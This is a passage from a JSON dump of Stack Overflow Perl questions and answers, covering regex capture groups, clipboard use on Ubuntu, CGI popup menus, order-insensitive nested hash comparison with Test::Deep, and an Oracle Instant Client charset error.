"profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1462887786, "post_id": 37140263, "comment_id": 61819382, "body": "<code>&#39;\\t&#39;</code> in single quotes is literally the backslash character and the letter &quot;t&quot;. You probably meant to use double quotes (<code>&quot;\\t&quot;</code>) or regex delimiters (<code>&#47;\\t&#47;</code>)"}, {"owner": {"reputation": 11, "user_id": 6162668, "user_type": "registered", "profile_image": "https://graph.facebook.com/933573863427936/picture?type=large", "display_name": "Matias Irazoqui", "link": "https://stackoverflow.com/users/6162668/matias-irazoqui"}, "edited": false, "score": 0, "creation_date": 1462887819, "post_id": 37140263, "comment_id": 61819404, "body": "something like this? /NC_.{8}/ or? /NC_......../"}, {"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1462887961, "post_id": 37140263, "comment_id": 61819519, "body": "<code>&#47;(NC_.{0,8})&#47;</code>? Without <code>()</code>, you won&#39;t have <code>$1</code> initialized."}], "owner": {"reputation": 11, "user_id": 6162668, "user_type": "registered", "profile_image": "https://graph.facebook.com/933573863427936/picture?type=large", "display_name": "Matias Irazoqui", "link": "https://stackoverflow.com/users/6162668/matias-irazoqui"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 146, "favorite_count": 0, "closed_date": 1462888116, "answer_count": 0, "score": 0, "last_activity_date": 1462887830, "creation_date": 1462887509, "last_edit_date": 1462887830, "question_id": 37140263, "link": "https://stackoverflow.com/questions/37140263/use-of-uninitialized-value-1-in-regex", "closed_reason": "Duplicate", "title": "Use of uninitialized value $1 in RegEx", "body": "<p>I have this code:</p>\n\n<pre><code>foreach my $line(&lt;INFILE&gt;) {\n  @data = split('\\t', $line);\n  print OUTNC \"$1\\n\" if ($data[1] =~ /NC_/);\n}\n</code></pre>\n\n<p>But when I run it, it gaves me the next error:\n\"Use of uninitialized value $1 in concatenation (.) or string at parser.pl line 15,  line 190805.\"</p>\n\n<p>Can you tell what's the error? Thanks!!</p>\n"}, {"tags": ["perl", "ubuntu", "command", "ubuntu-14.04", "geany"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462888273, "post_id": 37139149, "comment_id": 61819765, "body": "<i>Always</i> <code>use strict</code> and <code>use warnings &#39;all&#39;</code> at the top of every Perl program that you write"}, {"owner": {"reputation": 1189, "user_id": 365107, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/0d7891acb29d9ae38e34edb324bb3514?s=128&d=identicon&r=PG", "display_name": "Vicky Dev", "link": "https://stackoverflow.com/users/365107/vicky-dev"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462897106, "post_id": 37139149, "comment_id": 61826122, "body": "I tried to install Win32::Clipboard in my Windows 7 system but that fails too and so I can&#39;t use Win32::Clipboard. I am getting some tests failed error"}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1462888215, "creation_date": 1462888215, "answer_id": 37140520, "question_id": 37139149, "link": "https://stackoverflow.com/questions/37139149/perl-copy-to-clipboard-not-working-with-clipboard-module/37140520#37140520", "title": "Perl copy to clipboard not working with Clipboard module", "body": "<p>The <a href=\"https://metacpan.org/pod/Clipboard\" rel=\"nofollow\"><code>Clipboard</code></a> module is written to perform equally well on Windows, Mac, and Linux systems. To achieve that it has three different driver modules which implement the functionality</p>\n\n<p>The Linux driver uses the <code>xclip</code> command-line tool, which isn't installed by default on Ubuntu. You must install it with</p>\n\n<pre><code>sudo apt install xclip\n</code></pre>\n\n<p>before the module will work for you</p>\n\n<p>There really should be a comment to this effect in the module's documentation, as it is far from obvious</p>\n"}, {"tags": [], "owner": {"reputation": 131, "user_id": 5833469, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a38bd73ba2236024f5d7140d83895660?s=128&d=identicon&r=PG&f=1", "display_name": "Dumbled0re", "link": "https://stackoverflow.com/users/5833469/dumbled0re"}, "is_accepted": false, "score": 1, "last_activity_date": 1474310665, "creation_date": 1474310665, "answer_id": 39580039, "question_id": 37139149, "link": "https://stackoverflow.com/questions/37139149/perl-copy-to-clipboard-not-working-with-clipboard-module/39580039#39580039", "title": "Perl copy to clipboard not working with Clipboard module", "body": "<p>The issue is that X-windows has three different cut-and-paste concepts:</p>\n\n<ul>\n<li>the \"primary selection\" (can be pasted with middle-mouse)</li>\n<li>the \"secondary selection\" (not relevant here)</li>\n<li>the \"clipboard\" (can be pasted with ^V)</li>\n</ul>\n\n<p>Reference: <a href=\"https://linux.die.net/man/1/xsel\" rel=\"nofollow\">https://linux.die.net/man/1/xsel</a></p>\n\n<p>Evidently the perl Clipboard package only knows about the primary selection.\nYou probably want both \"primary\" and \"clipboard\", or at least \"clipboard\".</p>\n\n<p>Working code to solve this problem under X-windows can be found at <a href=\"https://www.av8n.com/security/Xclip.pm\" rel=\"nofollow\">https://www.av8n.com/security/Xclip.pm</a></p>\n\n<p>Invoke as:</p>\n\n<pre><code>use Xclip;\nXclip::copy2(\"some stuff\");\n</code></pre>\n\n<p>Requires either <code>xsel</code> or <code>xclip</code> to be installed.</p>\n"}], "owner": {"reputation": 1189, "user_id": 365107, "user_type": "registered", "accept_rate": 41, "profile_image": "https://www.gravatar.com/avatar/0d7891acb29d9ae38e34edb324bb3514?s=128&d=identicon&r=PG", "display_name": "Vicky Dev", "link": "https://stackoverflow.com/users/365107/vicky-dev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1771, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1474310665, "creation_date": 1462884732, "question_id": 37139149, "link": "https://stackoverflow.com/questions/37139149/perl-copy-to-clipboard-not-working-with-clipboard-module", "title": "Perl copy to clipboard not working with Clipboard module", "body": "<p>I have Perl 5.18.2 version installed in my Ubuntu 14.04 LTS.</p>\n\n<p>Now I have created a custom command in geany which I am firing as below:</p>\n\n<pre><code>perl /home/ubuntu/geany_custom_cmds/get_current_directory_path.pl %f %d %e\n</code></pre>\n\n<p>And below is the code of <code>get_current_directory_path.pl</code> file:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\n# print $ARGV[0];\nuse Clipboard;\nforeach $argnum (0 .. $#ARGV) {\n    print \"$ARGV[$argnum]\\n\";\n    Clipboard-&gt;copy($ARGV[$argnum]);\n    print Clipboard-&gt;paste;\n}\n</code></pre>\n\n<p>But I am not getting any argument's value in my Ubuntu clipboard which I can paste by Ctrl + V.</p>\n\n<p>Any suggestions are welcome.</p>\n"}, {"tags": ["perl", "cgi"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462880665, "post_id": 37137307, "comment_id": 61813800, "body": "There are a couple of issues with your code. I don&#39;t fully understand what you are trying to do. <code>@types eq &#39;Workflow Group&#39;</code> doesn&#39;t do what you think. It evaluates <code>@types</code> in scalar context, so it becomes <code>1</code> if there is one element in that array. And <code>1 eq &#39;Workflow Group&#39;</code> is false."}, {"owner": {"reputation": 49, "user_id": 5462683, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-1Wx7lkBR4t8/AAAAAAAAAAI/AAAAAAAAFIo/ntksApZlMyw/photo.jpg?sz=128", "display_name": "Markus", "link": "https://stackoverflow.com/users/5462683/markus"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462881366, "post_id": 37137307, "comment_id": 61814344, "body": "@simbabque if I take at <code>Workflow Group</code> for <code>%dataworkflow_group</code> in lists or <code>Tasktype</code> for <code>%tasktype_group</code> in lists. <code>1 eq &#39;Workflow Group&#39;</code> isn&#39;t working. I try <code>if (exists  $types{$type})</code> or<code>if (unfined $types{$type})</code> , but that&#39;re also both not working."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462881840, "post_id": 37137307, "comment_id": 61814695, "body": "Please <a href=\"https://stackoverflow.com/posts/37137307/edit\">edit</a> your question and fix the typos in your code. There are semicolons and commas mixed up and it&#39;s not clear if that is part of the problem, or simply an error when copy/pasting here. Show your <i>real code</i>."}, {"owner": {"reputation": 49, "user_id": 5462683, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-1Wx7lkBR4t8/AAAAAAAAAAI/AAAAAAAAFIo/ntksApZlMyw/photo.jpg?sz=128", "display_name": "Markus", "link": "https://stackoverflow.com/users/5462683/markus"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462884693, "post_id": 37137307, "comment_id": 61816928, "body": "@simbabque Ok. My Edit is finished. I&#39;ve this little correct and another."}], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 5462683, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-1Wx7lkBR4t8/AAAAAAAAAAI/AAAAAAAAFIo/ntksApZlMyw/photo.jpg?sz=128", "display_name": "Markus", "link": "https://stackoverflow.com/users/5462683/markus"}, "edited": false, "score": 0, "creation_date": 1463047202, "post_id": 37169031, "comment_id": 61900152, "body": "Ah. You were right! I have to try Javascript. Javascript should good function. Thank you!"}], "tags": [], "owner": {"reputation": 49, "user_id": 2303105, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/907e009bfd90e8642874377f6f336366?s=128&d=identicon&r=PG", "display_name": "Steven F Kohler", "link": "https://stackoverflow.com/users/2303105/steven-f-kohler"}, "is_accepted": true, "score": 1, "last_activity_date": 1462986137, "creation_date": 1462986137, "answer_id": 37169031, "question_id": 37137307, "link": "https://stackoverflow.com/questions/37137307/perl-popup-menu-selection/37169031#37169031", "title": "Perl Popup_Menu Selection", "body": "<p>Looks like your code is actually be working from a Perl/CGI perspective, but it may not be what you are expecting.  I have tested your code with both $types = \"Workflow Group\" (any defined value would work) and $types = \"\".</p>\n\n<p>If $types is equal to anything, the %workflow_group popup is shown.  If $types is \"\" the %tasktype_group popup is shown.  So the if/else conditions are working.  And this leads me to conclude that your</p>\n\n<pre><code>  my $types = $lqcgi-&gt;param('Workflow Group');\n</code></pre>\n\n<p>has no value.  I am not sure whether you expect the $lqcgi->param('Workflow Group') value to be determined when the user chooses a value for the Type popup, and then automatically change the Value popup.  If that is the case, you would likely need to do modify the Value popup after the Type choice is made using something like Javascript.  Hope this helps.</p>\n"}], "owner": {"reputation": 49, "user_id": 5462683, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh3.googleusercontent.com/-1Wx7lkBR4t8/AAAAAAAAAAI/AAAAAAAAFIo/ntksApZlMyw/photo.jpg?sz=128", "display_name": "Markus", "link": "https://stackoverflow.com/users/5462683/markus"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 250, "favorite_count": 0, "accepted_answer_id": 37169031, "answer_count": 1, "score": 0, "last_activity_date": 1462986137, "creation_date": 1462879947, "last_edit_date": 1462884009, "question_id": 37137307, "link": "https://stackoverflow.com/questions/37137307/perl-popup-menu-selection", "title": "Perl Popup_Menu Selection", "body": "<p>I try to popup_menu select with if/else. But it isn't work with if/else.</p>\n\n<p>The Select for Workflow or Tasktyp change with differ lists.</p>\n\n<p><strong>Workflow Group or Tasktyp for Type:</strong></p>\n\n<pre><code>my %datatype = (\n    'workflow_group' =&gt; 'Workflow Group',\n    'tasktype_group' =&gt; 'TaskType',\n);\n</code></pre>\n\n<p><strong>Workflow Group or Tasktype for Value:</strong></p>\n\n<pre><code>my %workflow_group = (\n    'one' =&gt; 'Contract',\n    'two' =&gt; 'Exchange',\n    'three' =&gt; 'Delivery',\n    'four' =&gt; 'Event',\n);\n\nmy %tasktype_group = (\n    'one' =&gt; 'Contract',\n    'two' =&gt; 'Router',\n    'three' =&gt; 'DocSender',\n    'four' =&gt; 'Transformer',\n);\n</code></pre>\n\n<p><strong>Script with Variable (if/else):</strong></p>\n\n<pre><code>print \"&lt;TR&gt;\";\n        print $lqcgi-&gt;td({-width=&gt;'10%',},\n        $lqcgi-&gt;h3('Type'),\n        $lqcgi-&gt;popup_menu(-name=&gt;'type',\n                  -values=&gt;[qw/workflow_group tasktype_group/],\n                  -labels=&gt;\\%datatype,\n                  -default=&gt;'type_select'));\n\n        my $types = $lqcgi-&gt;param('Workflow Group');\n\n        print \"&lt;TD&gt;&lt;h3&gt;Value&lt;/h3&gt;\";\n        if ($types){\n        print $lqcgi-&gt;popup_menu(-name=&gt;'value',\n                  -values=&gt;[qw/one two three four/],\n                  -labels=&gt;\\%workflow_group,\n                  -default=&gt;'workflow'),\n        $lqcgi-&gt;submit(-type =&gt; 'tasktype_start_command', -value =&gt; 'Start', -onclick =&gt; 'javascript:()'),\n        $lqcgi-&gt;submit(-type =&gt; 'tasktype_stop_command', -value =&gt; 'Stop', -onclick =&gt; 'javascript:()');\n        }\n        else{\n        print $lqcgi-&gt;popup_menu(-name=&gt;'value',\n                  -values=&gt;[qw/one two three four/],\n                  -labels=&gt;\\%tasktype_group,\n                  -default=&gt;'tasktype'),\n        $lqcgi-&gt;submit(-type =&gt; 'tasktype_start_command', -value =&gt; 'Start', -onclick =&gt; 'javascript:()'),\n        $lqcgi-&gt;submit(-type =&gt; 'tasktype_stop_command', -value =&gt; 'Stop', -onclick =&gt; 'javascript:()');\n        }\nprint \"&lt;/TD&gt;&lt;/TR&gt;\";\n</code></pre>\n\n<p>Notice: <code>foreach my $type(@types)</code>, <code>if (exists $types{$type})</code>, <code>if (defined $types{$type}</code>isn't working! Thank for your help!</p>\n\n<p><strong>Here is find wrong:</strong></p>\n\n<p><a href=\"https://i.stack.imgur.com/NTwpw.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/NTwpw.jpg\" alt=\"enter image description here\"></a></p>\n"}, {"tags": ["json", "perl", "hash", "perl-data-structures"], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 3930459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cdb28e4b1b1dc0274bbba1547533d5?s=128&d=identicon&r=PG&f=1", "display_name": "Girish", "link": "https://stackoverflow.com/users/3930459/girish"}, "edited": false, "score": 0, "creation_date": 1462959645, "post_id": 37135804, "comment_id": 61853355, "body": "Thanks simbabque for the answer, How do I bag all array references inside hash dynamically.  $hash2 is output produced and contain nested hash, how do I dynamically say to cmp_deeply that any array comparision should be done via bag, or should I traverse the hash and do individual bag comparisions."}, {"owner": {"reputation": 35, "user_id": 3930459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cdb28e4b1b1dc0274bbba1547533d5?s=128&d=identicon&r=PG&f=1", "display_name": "Girish", "link": "https://stackoverflow.com/users/3930459/girish"}, "edited": false, "score": 0, "creation_date": 1462960960, "post_id": 37135804, "comment_id": 61854323, "body": "Thanks @simbabque, How do I bag all array references inside hash dynamically.       <code>my $arr_of_h1 = {&#39;a&#39; =&gt; [1, 2 , 3], b =&gt; [{2 =&gt; 1}, {1 =&gt; 1}, {3 =&gt; 1}]};</code>       <code>my $arr_of_h2 = {&#39;a&#39; =&gt; [1, 2 , 3], b =&gt; [{2 =&gt; 1}, {3 =&gt; 1}, {1 =&gt; 1}]};</code>     <code>cmp_deeply($arr_of_h1-&gt;{b}, bag(@{$arr_of_h2-&gt;{b}}),&quot;Array are equal&quot;);</code>   Above stmt works, but want below to work by performing bag comparisons.       <code>cmp_deeply($arr_of_h1, $arr_of_h2,&quot;Hash are equal&quot;);</code>"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 35, "user_id": 3930459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cdb28e4b1b1dc0274bbba1547533d5?s=128&d=identicon&r=PG&f=1", "display_name": "Girish", "link": "https://stackoverflow.com/users/3930459/girish"}, "edited": false, "score": 0, "creation_date": 1462964737, "post_id": 37135804, "comment_id": 61856961, "body": "@user I think you would have to build that. Or maybe there is some hooking mechanism. Did you read the full Test::Deep docs? Otherwise you can use <a href=\"https://metacpan.org/pod/Data::Visitor\" rel=\"nofollow noreferrer\">metacpan.org/pod/Data::Visitor</a> or something similar to build the traversal. I suggest you ask a new question for that one, as it is different from the initial question here."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 35, "user_id": 3930459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cdb28e4b1b1dc0274bbba1547533d5?s=128&d=identicon&r=PG&f=1", "display_name": "Girish", "link": "https://stackoverflow.com/users/3930459/girish"}, "edited": false, "score": 0, "creation_date": 1462966309, "post_id": 37135804, "comment_id": 61858004, "body": "@user see my update. In fact, I had the same problem recently in a test, but decided to change the test case. Figuring this one out was fun."}, {"owner": {"reputation": 35, "user_id": 3930459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cdb28e4b1b1dc0274bbba1547533d5?s=128&d=identicon&r=PG&f=1", "display_name": "Girish", "link": "https://stackoverflow.com/users/3930459/girish"}, "edited": false, "score": 1, "creation_date": 1463138452, "post_id": 37135804, "comment_id": 61948318, "body": "Thanks for the amazing answer. With the override I was able to compare 2 complex hashes by ignoring the order of the array."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 35, "user_id": 3930459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cdb28e4b1b1dc0274bbba1547533d5?s=128&d=identicon&r=PG&f=1", "display_name": "Girish", "link": "https://stackoverflow.com/users/3930459/girish"}, "edited": false, "score": 0, "creation_date": 1463140239, "post_id": 37135804, "comment_id": 61949609, "body": "@Girish happy I could help. If my answer answered your question, please accept it by clicking the tick mark on the left below the votes. You can take the <a href=\"https://stackoverflow.com/tour\">tour</a> if you need help with that. :)"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 6, "last_activity_date": 1462966264, "last_edit_date": 1495541275, "creation_date": 1462875977, "answer_id": 37135804, "question_id": 37135504, "link": "https://stackoverflow.com/questions/37135504/perl-compare-two-nested-hash/37135804#37135804", "title": "Perl - Compare two nested hash", "body": "<p>You can use <a href=\"https://metacpan.org/pod/Test::Deep\" rel=\"nofollow noreferrer\">Test::Deep</a>, which provides <code>cmp_deeply</code>. It's a lot more versatile than Test::More's <code>is_deeply</code>.</p>\n\n<pre><code>use Test::Deep;\n\nmy $hash1 = {\n    k1 =&gt; { k11 =&gt; 'v1', k12 =&gt; 'v2' }, k2 =&gt; { k21 =&gt; [ 'v1', 'v2', 'v3' ] } };\nmy $hash2 = {\n    k1 =&gt; { k11 =&gt; 'v1', k12 =&gt; 'v2' }, k2 =&gt; { k21 =&gt; bag( 'v3', 'v2', 'v1' ) } };\n\ncmp_deeply( $hash1, $hash2, );\n</code></pre>\n\n<p>The trick is the <a href=\"https://metacpan.org/pod/Test::Deep#bag-elements\" rel=\"nofollow noreferrer\"><code>bag()</code> function</a>, which ignores the order of elements.</p>\n\n<blockquote>\n  <p>This does a bag comparison, that is, it compares two arrays but ignores the order of the elements [...]</p>\n</blockquote>\n\n<hr>\n\n<p><strong>Update</strong>: From <a href=\"https://stackoverflow.com/questions/37135504/perl-compare-two-nested-hash/37135804?noredirect=1#comment61854323_37135804\">your comment</a>:</p>\n\n<blockquote>\n  <p>How do I bag all array references inside hash dynamically</p>\n</blockquote>\n\n<p>Some digging in the code of Test::Deep showed that it's possible to overwrite it. I looked <a href=\"https://metacpan.org/source/RJBS/Test-Deep-1.120/lib/Test/Deep.pm#L135\" rel=\"nofollow noreferrer\">at Test::Deep</a> itself first, and found that there is a <a href=\"https://metacpan.org/source/Test::Deep::Array\" rel=\"nofollow noreferrer\">Test::Deep::Array</a>, which deals with arrays. All of the packages that handle stuff inside of T::D have <a href=\"https://metacpan.org/source/Test::Deep::Array#L17\" rel=\"nofollow noreferrer\">a <code>descend</code> method</a>. So that's where we need to hook in.</p>\n\n<p><a href=\"https://metacpan.org/pod/Sub::Override\" rel=\"nofollow noreferrer\">Sub::Override</a> is great to temporarily override stuff, instead of messing with typeglobs. </p>\n\n<p>Basically all we need to do is replace the call to <code>Test::Deep::arrayelementsonly</code> in <code>Test::Deep::Array::descend</code>'s final line with a call to <code>bag()</code>. The rest is simply copied (indentation is mine). For small <a href=\"https://en.wikipedia.org/wiki/Monkey_patch\" rel=\"nofollow noreferrer\">monkey-patching</a> a copy of the existing code with a slight modification is usually the easiest approach.</p>\n\n<pre><code>use Test::Deep;\nuse Test::Deep::Array;\nuse Sub::Override;\n\nmy $sub = Sub::Override-&gt;new(\n    'Test::Deep::Array::descend' =&gt; sub {\n        my $self = shift;\n        my $got  = shift;\n\n        my $exp = $self-&gt;{val};\n\n        return 0 unless Test::Deep::descend( \n             $got, Test::Deep::arraylength( scalar @$exp ) );\n\n        return 0 unless $self-&gt;test_class($got);\n\n        return Test::Deep::descend( $got, Test::Deep::bag(@$exp) );\n    }\n);\n\nmy $hash1 = {\n    k1 =&gt; { k11 =&gt; 'v1', k12 =&gt; 'v2' },\n    k2 =&gt; { k21 =&gt; [ 'v1', 'v2', 'v3' ] }\n};\nmy $hash2 = {\n    k1 =&gt; { k11 =&gt; 'v1', k12 =&gt; 'v2' },\n    k2 =&gt; { k21 =&gt; [ 'v3', 'v2', 'v1' ] }\n};\n\ncmp_deeply( $hash1, $hash2 );\n</code></pre>\n\n<p>This will make the test pass.</p>\n\n<p><strong>Make sure to reset the override</strong> by undefining <code>$sub</code> or letting it go out of scope, or you might have some weird surprises if the rest of your test suite also uses Test::Deep.</p>\n"}], "owner": {"reputation": 35, "user_id": 3930459, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b1cdb28e4b1b1dc0274bbba1547533d5?s=128&d=identicon&r=PG&f=1", "display_name": "Girish", "link": "https://stackoverflow.com/users/3930459/girish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1113, "favorite_count": 1, "accepted_answer_id": 37135804, "answer_count": 1, "score": 3, "last_activity_date": 1462966264, "creation_date": 1462875238, "question_id": 37135504, "link": "https://stackoverflow.com/questions/37135504/perl-compare-two-nested-hash", "title": "Perl - Compare two nested hash", "body": "<p>This is my scenario, where there are 2 hashes that have been decoded from 2 JSON files.</p>\n\n<p>I have 2 complex hash,</p>\n\n<pre><code>$hash1 = {k1=&gt; { k11 =&gt; v1, k12 =&gt; v2}, k2 =&gt; { k21 =&gt; [v1, v2, v3] }}\n$hash2 = {k1=&gt; { k11 =&gt; v1, k12 =&gt; v2}, k2 =&gt; { k21 =&gt; [v3, v2, v1] }}\n</code></pre>\n\n<p>I want to compare these 2 hash for equality, and used Compare of Data::Compare and is_deeply of Test::More. Both do not ignore the order of the array.<br>\nI want to compare ignoring the order of array values of key 'k21'.<br>\nMy App populates the array from 'keys %hash' which gives random order.<br>\nTried 'ignore_hash_keys' of Data::Compare, but my hash sometimes can be complex and don't want to ignore.</p>\n\n<p>Key 'k21' can also sometimes have array of hashes.</p>\n\n<pre><code>$hash3 = {k1=&gt; { k11 =&gt; v1}, k2 =&gt; { k21 =&gt; [{v3 =&gt; v31}, {v2 =&gt; v22}] }}\n</code></pre>\n\n<p>How do I compare such complex hash by ignoring the array order.</p>\n"}, {"tags": ["oracle", "perl", "remote-access", "dbi"], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 4491821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d25f5f1781a832ed5e534a3ee38a32db?s=128&d=identicon&r=PG&f=1", "display_name": "Ayrat Salavatovich", "link": "https://stackoverflow.com/users/4491821/ayrat-salavatovich"}, "edited": false, "score": 0, "creation_date": 1462875200, "post_id": 37134999, "comment_id": 61809862, "body": "I&#39;m use the Instant Client Package. Downloaded from <a href=\"http://www.oracle.com/technetwork/topics/winsoft-085727.html\" rel=\"nofollow noreferrer\">oracle.com/technetwork/topics/winsoft-085727.html</a> for Version 11.2.0.2.0 (Instant Client Package - Basic: All files required to run OCI, OCCI, and JDBC-OCI applications)"}, {"owner": {"reputation": 13, "user_id": 4491821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d25f5f1781a832ed5e534a3ee38a32db?s=128&d=identicon&r=PG&f=1", "display_name": "Ayrat Salavatovich", "link": "https://stackoverflow.com/users/4491821/ayrat-salavatovich"}, "edited": false, "score": 0, "creation_date": 1462877807, "post_id": 37134999, "comment_id": 61811655, "body": "On server, application is running successfully"}, {"owner": {"reputation": 4133, "user_id": 836215, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/96343cdb1ae4d50aa89067f4427dccca?s=128&d=identicon&r=PG", "display_name": "ibre5041", "link": "https://stackoverflow.com/users/836215/ibre5041"}, "reply_to_user": {"reputation": 13, "user_id": 4491821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d25f5f1781a832ed5e534a3ee38a32db?s=128&d=identicon&r=PG&f=1", "display_name": "Ayrat Salavatovich", "link": "https://stackoverflow.com/users/4491821/ayrat-salavatovich"}, "edited": false, "score": 0, "creation_date": 1463388502, "post_id": 37134999, "comment_id": 62027887, "body": "the server contains the &quot;full&quot; thick client, which supports all charsets."}], "tags": [], "owner": {"reputation": 4133, "user_id": 836215, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/96343cdb1ae4d50aa89067f4427dccca?s=128&d=identicon&r=PG", "display_name": "ibre5041", "link": "https://stackoverflow.com/users/836215/ibre5041"}, "is_accepted": false, "score": 0, "last_activity_date": 1462873998, "creation_date": 1462873998, "answer_id": 37134999, "question_id": 37133941, "link": "https://stackoverflow.com/questions/37133941/dbi-connect-failed-error-ocinlsenvironmentvariablegetoci-nls-charset-id/37134999#37134999", "title": "DBI connect failed: ERROR OCINlsEnvironmentVariableGet(OCI_NLS_CHARSET_ID)", "body": "<p>Are you using Instant Client Oracle libraries? AFAIK Instant client supports only WE8ISO8859P1 and AL32UTF8. Try to use full (thick) Oracle client.</p>\n"}, {"tags": [], "owner": {"reputation": 13, "user_id": 4491821, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d25f5f1781a832ed5e534a3ee38a32db?s=128&d=identicon&r=PG&f=1", "display_name": "Ayrat Salavatovich", "link": "https://stackoverflow.com/users/4491821/ayrat-salavatovich"}, "is_accepted": false, "score": 0, "last_activity_date": 1462881224, "creation_date": 1462881224, "answer_id": 37137782, "question_id": 37133941, "link": "https://stackoverflow.com/questions/37133941/dbi-connect-failed-error-ocinlsenvironmentvariablegetoci-nls-charset-id/37137782#37137782", "title": "DBI connect failed: ERROR OCINlsEnvironmentVariableGet(OCI_NLS_CHARSET_ID)", "body": "<ol>\n<li><p>Download the appropriate Instant Client packages for your platform from <a href=\"http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html\" rel=\"nofollow\">http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html</a>.</p></li>\n<li><p>Unzip the packages into a single directory (for example such as \"instantclient_11_2\").</p></li>\n<li><p>Set your environment's library loading path (for example LD_LIBRARY_PATH on Linux, or PATH on Windows) to the directory created in Step 2.</p></li>\n</ol>\n\n<p>And it works 